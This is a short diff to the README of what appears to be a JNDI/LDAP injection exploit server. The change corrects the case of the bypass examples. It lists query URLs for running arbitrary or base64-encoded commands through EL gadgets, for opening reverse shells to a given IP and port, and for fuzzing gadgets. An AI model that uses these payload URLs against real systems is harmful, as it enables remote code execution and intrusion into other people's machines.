@@ -115,10 +115,10 @@ Supported LADP Queries：
     ldap://127.0.0.1:1389/basic/ReverseShell/[ip]/[port]  ---windows NOT supported
 
 [+] ByPass Queries: ldap://127.0.0.1:1389/bypass/[PayloadType]/[Type]/[Params], e.g.
-    Example:ldap://127.0.0.1:1389/bypass/El/[cmd]
-    Example:ldap://127.0.0.1:1389/bypass/El/base64/[base64_encoded_cmd]
-    Example:ldap://127.0.0.1:1389/bypass/El/reverseshell/[ip]/[port]  ---windows NOT supported
-    Example:ldap://127.0.0.1:1389/bypass/El/reverseshell2/[ip]/[port]  ---windows NOT supported
+    Example:ldap://127.0.0.1:1389/bypass/EL/[cmd]
+    Example:ldap://127.0.0.1:1389/bypass/EL/base64/[base64_encoded_cmd]
+    Example:ldap://127.0.0.1:1389/bypass/EL/reverseshell/[ip]/[port]  ---windows NOT supported
+    Example:ldap://127.0.0.1:1389/bypass/EL/reverseshell2/[ip]/[port]  ---windows NOT supported
 
 [+] Fuzz Queries: ldap://127.0.0.1:1389/fuzz/[GadgetType]/[domain], e.g.
     Example:ldap://127.0.0.1:1389/fuzz/EL/[domain]
